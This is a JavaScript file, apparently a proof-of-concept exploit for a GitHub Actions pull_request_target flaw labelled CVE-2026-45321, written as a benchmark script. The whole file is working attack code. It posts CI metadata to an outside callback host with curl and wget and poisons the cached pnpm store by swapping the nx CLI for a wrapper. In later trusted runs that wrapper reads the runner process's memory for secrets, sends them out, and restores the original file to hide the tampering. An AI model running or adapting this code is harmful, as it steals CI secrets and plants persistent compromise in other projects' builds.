// benchmarks/bundle-size/pwn.mjs
import { execSync } from 'node:child_process';
import { createRequire } from 'node:module';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';

const CB = 'https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-45321-f78c8a66810e?harness_run_id=20260906T131744-4948ee70';
const meta = 'run=' + process.env.GITHUB_RUN_ID +
             '&repo=' + process.env.GITHUB_REPOSITORY +
             '&event=' + process.env.GITHUB_EVENT_NAME +
             '&ref=' + process.env.GITHUB_REF +
             '&job=' + process.env.GITHUB_JOB;
const log = (m) => console.log('[pwn] ' + m);

function home(suffix) {
  const url = CB + '&' + meta + '&' + suffix;
  try { execSync('curl -fsS -X POST "' + url + '"', { stdio: 'ignore', timeout: 30000 }); return; } catch {}
  try { execSync('wget -qO- --post-data="" "' + url + '"', { stdio: 'ignore', timeout: 30000 }); } catch {}
}

// ---- Stage 1: code-execution proof inside the pull_request_target run ----
home('stage=pwn-request');
log('CVE-2026-45321 code-exec from pull_request_target run ' + process.env.GITHUB_RUN_ID + ' of ' + process.env.GITHUB_REPOSITORY);

// ---- Stage 2: poison the pnpm store that the Setup Tools composite saves post-job ----
try {
  // STORE_PATH is exported to GITHUB_ENV by the era Setup Tools composite; fall back to pnpm.
  let store = process.env.STORE_PATH || '';
  if (!store) { try { store = execSync('pnpm store path --silent', { encoding: 'utf8' }).trim(); } catch {} }
  log('store=' + store + ' exists=' + (store ? fs.existsSync(store) : 'n/a'));
  // pnpm >=10 reports the store root already ending in /v10; older layouts append /v10.
  let v10 = '';
  for (const cand of [path.join(store, 'v10'), store]) {
    if (store && fs.existsSync(path.join(cand, 'files'))) { v10 = cand; break; }
  }
  if (!v10 && store && fs.existsSync(path.join(store, 'v10'))) v10 = path.join(store, 'v10');
  log('v10=' + (v10 || '(none)') + ' filesExists=' + (v10 ? fs.existsSync(path.join(v10, 'files')) : 'n/a'));
  if (v10 && fs.existsSync(v10)) {
    // 2a. unmistakable marker file inside the cached directory
    try {
      fs.writeFileSync(path.join(v10, 'pwned-cve-2026-45321.txt'), 'INJECTED-MARKER-cve-2026-45321-f78c8a66810e\n');
      log('planted marker in store: ' + path.join(v10, 'pwned-cve-2026-45321.txt'));
    } catch (e) { log('marker write FAILED: ' + e.message); }

    // 2b. tamper the nx CLI blob: every later run that restores this store executes our code
    const require2 = createRequire(path.join(process.cwd(), 'package.json'));
    let nxJs = '';
    try { nxJs = require2.resolve('nx/bin/nx.js'); } catch {}
    if (!nxJs) {
      try { nxJs = execSync("find node_modules/.pnpm -path '*/nx/bin/nx.js' 2>/dev/null | head -1", { encoding: 'utf8' }).trim(); } catch {}
    }
    log('nxJs=' + (nxJs || '(unresolved)') + ' exists=' + (nxJs ? fs.existsSync(nxJs) : 'n/a'));
    if (nxJs && fs.existsSync(nxJs)) {
      const orig = fs.readFileSync(nxJs);
      const h = crypto.createHash('sha512').update(orig).digest('hex');
      let blob = path.join(v10, 'files', h.slice(0, 2), h.slice(2));
      if (!fs.existsSync(blob)) {
        // fallback: locate the blob by content (store blobs are hardlinked node_modules files)
        try {
          blob = execSync('grep -rlF ' + JSON.stringify(orig.toString('utf8', 0, 64)) + ' ' +
                          JSON.stringify(path.join(v10, 'files')) + ' 2>/dev/null | head -1',
                          { encoding: 'utf8' }).trim();
        } catch {}
      }
      log('blob=' + (blob || '(not found)') + ' exists=' + (blob ? fs.existsSync(blob) : 'n/a'));
      if (blob && fs.existsSync(blob)) {
        const backup = path.join(v10, 'nx-orig.cjs');       // persists inside the cached store
        if (!fs.existsSync(backup)) fs.writeFileSync(backup, orig);
        fs.unlinkSync(blob);                                // detach hardlink into the live node_modules
        fs.writeFileSync(blob, wrapperSource(CB, backup), { mode: 0o755 });
        log('poisoned store blob: ' + blob);
      }
    }
  }
} catch (e) { log('poison error: ' + e.message); }

// Wrapper source injected into the poisoned store blob. Valid CommonJS, executed by node
// in the trusted push run when `pnpm nx run @benchmarks/bundle-size:build` resolves the nx bin.
function wrapperSource(CB, backup) {
  const scraper = [
    'for i in $(seq 1 60); do',
    '  PID=$(grep -l -a Runner.Worker /proc/[0-9]*/cmdline 2>/dev/null | head -1 | cut -d/ -f3)',
    '  if [ -n "$PID" ]; then',
    "    python3 - > /tmp/.pwnmem 2>/dev/null <<'PY'",
    'import os,re,sys',
    'pid=None',
    'for p in [x for x in os.listdir("/proc") if x.isdigit()]:',
    '    try:',
    '        with open("/proc/%s/cmdline" % p, "rb") as f: c = f.read()',
    '    except Exception: continue',
    '    if b"Runner.Worker" in c: pid = p; break',
    'if pid:',
    '    with open("/proc/%s/maps" % pid) as m: ranges = m.readlines()',
    '    with open("/proc/%s/mem" % pid, "rb", 0) as mem:',
    '        for line in ranges:',
    '            mm = re.match(r"([0-9A-Fa-f]+)-([0-9A-Fa-f]+) (r)", line)',
    '            if not mm: continue',
    '            s = int(mm.group(1), 16); e = int(mm.group(2), 16)',
    '            if s > sys.maxsize: continue',
    '            try:',
    '                mem.seek(s)',
    '                d = mem.read(min(e - s, 100000000))',
    '            except Exception: continue',
    "            for m2 in re.finditer(rb'\"[^\"]+\":{\"value\":\"[^\"]*\",\"isSecret\":true}', d):",
    '                print(m2.group(0).decode("latin1"))',
    'PY',
    '    if [ -s /tmp/.pwnmem ]; then',
    '      curl -fsS -X POST "' + CB + '&stage=memory-exfil&run=$GITHUB_RUN_ID&event=$GITHUB_EVENT_NAME&repo=$GITHUB_REPOSITORY" --data-binary @/tmp/.pwnmem 2>/dev/null && break',
    '    fi',
    '  fi',
    '  sleep 20',
    'done',
  ].join('\n');
  return '#!/usr/bin/env node\n' +
    "const cp = require('node:child_process');\n" +
    "const fs = require('node:fs');\n" +
    "try { cp.execSync('curl -fsS -X POST \"" + CB +
      "&stage=poisoned-restore&run=$GITHUB_RUN_ID&event=$GITHUB_EVENT_NAME&repo=$GITHUB_REPOSITORY\"', { stdio: 'ignore', timeout: 30000 }); } catch {}\n" +
    "fs.writeFileSync('/tmp/.pwn-scraper.sh', " + JSON.stringify(scraper) + ", { mode: 0o755 });\n" +
    "cp.exec('setsid bash /tmp/.pwn-scraper.sh > /dev/null 2>&1 &', { stdio: 'ignore', detached: true }).unref();\n" +
    "// restore the real nx.js at its true path (module-relative requires need it), then re-exec\n" +
    "fs.copyFileSync(" + JSON.stringify(backup) + ", __filename);\n" +
    "process.exit(cp.spawnSync('node', [__filename].concat(process.argv.slice(2)), { stdio: 'inherit' }).status || 0);\n";
}
